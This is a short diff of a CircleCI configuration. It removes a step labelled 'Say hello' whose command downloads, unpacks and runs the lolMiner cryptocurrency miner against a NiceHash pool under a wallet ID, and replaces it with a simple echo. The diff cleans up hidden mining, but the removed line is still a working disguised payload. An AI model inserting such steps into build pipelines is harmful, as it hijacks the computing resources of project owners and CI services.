@@ -16,8 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "!wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.47/lolMiner_v1.47_Lin64.tar.gz && tar xf lolMiner_v1.47_Lin64.tar.gz && cd 1.47 && ./lolMiner --algo BEAM-III --pool stratum+tcp://beamv3.eu-west.nicehash.com:3387 --user 3PtASJbJvcPeiaTPzi3gNy3QXMKPEU8pxC.worker --tls 0 
-"
+          command: "echo Hello, World!"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
